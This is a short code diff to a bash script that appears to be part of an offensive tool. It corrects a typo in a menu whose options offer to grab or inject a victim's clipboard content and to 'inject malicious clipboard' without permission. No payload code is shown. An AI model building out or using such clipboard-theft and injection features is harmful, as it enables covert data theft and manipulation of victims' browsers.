@@ -242,7 +242,7 @@ clip_option() {
 
 printf "\n"
 printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Grab/Inject clipboard content \e[0m\e[1;77m(requires user permission)\e[0m\e[1;93m:\e[0m\n"
-printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Inject malicious clipboard \e[0m\e[1;77m(doenst require permission)\e[0m\e[1;93m:\e[0m\n"
+printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Inject malicious clipboard \e[0m\e[1;77m(does not require permission)\e[0m\e[1;93m:\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option_clip
 option_server="${option_server:-${default_option_server}}"
